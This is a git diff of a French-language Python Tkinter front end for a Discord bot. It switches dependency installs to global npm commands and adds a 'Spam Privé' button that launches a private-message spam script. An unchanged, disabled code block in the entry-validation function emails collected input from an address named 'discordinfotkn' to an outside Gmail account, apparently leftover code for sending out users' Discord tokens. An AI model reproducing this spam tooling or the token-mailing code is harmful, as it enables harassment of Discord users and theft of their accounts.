@@ -106,16 +106,11 @@ def aide():
 def installt():
     showinfo('Installation des dépendences',
              'L\'installation va commencer, veuillez patienter. Si l\'application ne répond plus, c\'est normal. Attendez juste. Cela risque de prendre un peu de temps.')
-    subprocess.call('npm --prefix ./core i discord.js', shell=True)
-    subprocess.call('npm --prefix ./core i fs', shell=True)
-    subprocess.call('npm --prefix ./core i ms', shell=True)
-    subprocess.call('npm --prefix ./core i moment', shell=True)
-    subprocess.call('npm --prefix ./core i chalk', shell=True)
-    subprocess.call('npm --prefix ./core/individuals i discord.js', shell=True)
-    subprocess.call('npm --prefix ./core/individuals i fs', shell=True)
-    subprocess.call('npm --prefix ./core/individuals i ms', shell=True)
-    subprocess.call('npm --prefix ./core/individuals i moment', shell=True)
-    subprocess.call('npm --prefix ./core/individuals i chalk', shell=True)
+    subprocess.call('npm i -g discord.js', shell=True)
+    subprocess.call('npm i -g fs', shell=True)
+    subprocess.call('npm i -g ms', shell=True)
+    subprocess.call('npm i -g moment', shell=True)
+    subprocess.call('npm i -g chalk', shell=True)
     showinfo('Dépendences installées',
              'Toutes les dépendences semblent avoir été installées.')
 
@@ -129,11 +124,12 @@ def backup():
 
 
 def uninstall_deps():
-    if askokcancel('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot."):
-        subprocess.run(
-            'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
-        subprocess.run(
-            'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+    if askokcancel('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot. Celà risque de prendre un peu de temps."):
+            subprocess.call('npm uninstall -g discord.js', shell=True)
+            subprocess.call('npm uninstall -g fs', shell=True)
+            subprocess.call('npm uninstall -g ms', shell=True)
+            subprocess.call('npm uninstall -g moment', shell=True)
+            subprocess.call('npm uninstall -g chalk', shell=True)
     showinfo('Terminé', 'Toutes les dépendances ont été désinstallées.')
 
 
@@ -272,7 +268,6 @@ def validd(entree, entree2, entree7):
         server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
         server.quit()   
         """
-
 
 validb.pack()
 
@@ -642,6 +637,17 @@ def softspam(spame):
             json.dump(data, jsonFile)
         subprocess.run('cd core\individuals && node softspam.js', shell=True)
 
+def spampv(spame):
+    if askokcancel('Lancer le spam privé', 'Voulez-vous vraiment lancer le spam privé ? Pendant que le bot spamme, il est impossible d\'utiliser l\'interface. Pour arrêter de spammer, envoyez "stop" au bot en privé.'):
+        with open("core\settings.json", "r") as jsonFile:
+            data = json.load(jsonFile)
+        data["config"]["msg"] = spame.get()
+        with open("core/settings.json", "w") as jsonFile:
+            json.dump(data, jsonFile)
+        subprocess.run('cd core/individuals && node spampv.js', shell=True)
+
+spampvbutton = Button(spam, text='Spam Privé', width=30,
+                      command=lambda: spampv(spame))
 
 softspambutton = Button(spam, text="Soft Spam", width=30,
                         command=lambda: softspam(spame))
